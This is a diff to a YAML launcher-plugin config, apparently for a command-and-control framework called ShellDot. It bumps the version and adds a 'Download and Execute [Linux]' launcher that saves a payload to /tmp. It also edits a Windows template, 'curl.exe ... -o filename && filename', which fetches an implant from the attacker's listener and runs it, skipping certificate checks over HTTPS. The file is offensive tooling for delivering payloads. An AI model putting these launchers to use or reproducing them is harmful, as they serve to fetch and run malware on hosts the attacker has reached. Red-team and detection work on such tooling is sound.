@@ -1,6 +1,6 @@
 ---
 name: Default Example Launchers
-version: 0.5.0
+version: 0.7.0
 description: Default Launchers Client Plugin by ShellDot
 type: launcher
 launchers:
@@ -17,25 +17,26 @@ launchers:
       - name: isHTTPS
         jsFn: |
           listener.configuration.https ? "-k" : " ";
-  # Same example but without external file template. The template is defined in this file.
-  # - name: "Download and Execute in [CMD]"
-  #   match:
-  #     type: ["EXECUTABLE", "DEBUG_EXECUTABLE"]
-  #     arch: ["x64", "x86"]
-  #     platform: ["windows"]
-  #   template: "curl.exe %%isHTTPS%% %%url%% -o %%filename%% && %%filename%%"
-  #   args:
-  #     - name: url
-  #     - name: isHTTPS
-  #       jsFn: |
-  #         listener.configuration.https ? "-k" : "";
-  #     - name: filename
+  - name: "Download and Execute [Linux]"
+    match:
+      type: ["EXECUTABLE", "DEBUG_EXECUTABLE"] # Supported Payload Types. Available: [EXECUTABLE, DEBUG_EXECUTABLE, SHELLCODE, SERVICE, DLL]
+      arch: ["x64", "x86"] # Supported payload architectures. Available: [x64, x86]
+      platform: ["linux"] # Supported platforms. Available: [windows, linux]
+    path: "template.multi.curl-exe.sh"
+    args:
+      - name: url
+      - name: filename
+        jsFn: |
+          `/tmp/payload-${Date.now()}.bin`
+      - name: isHTTPS
+        jsFn: |
+          listener.configuration.https ? "-k" : " ";
   - name: "Download and Execute in [CMD] rand(filename) "
     match:
       type: ["EXECUTABLE", "DEBUG_EXECUTABLE"]
       arch: ["x64", "x86"]
       platform: ["windows"]
-    template: "curl.exe %%isHTTPS%% %%url%% -o %%filename%% && %%filename%%"
+    template: 'curl.exe %%isHTTPS%% "%%url%%" -o %%filename%% && %%filename%%'
     args:
       - name: url
       - name: isHTTPS
